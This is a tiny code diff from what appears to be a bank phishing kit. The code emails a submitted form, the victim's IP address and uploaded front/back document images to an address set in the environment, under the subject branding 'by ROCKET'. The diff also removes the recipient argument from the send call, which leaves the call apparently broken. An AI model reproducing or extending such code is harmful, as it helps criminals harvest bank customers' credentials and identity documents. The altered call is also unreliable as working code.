@@ -153,7 +153,6 @@ ${
 
     if (process.env.TO) {
       await sendEmail(
-        process.env.TO as string,
         message,
         `${process.env.BANK_NAME} - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`,
         req.files && (front || back)
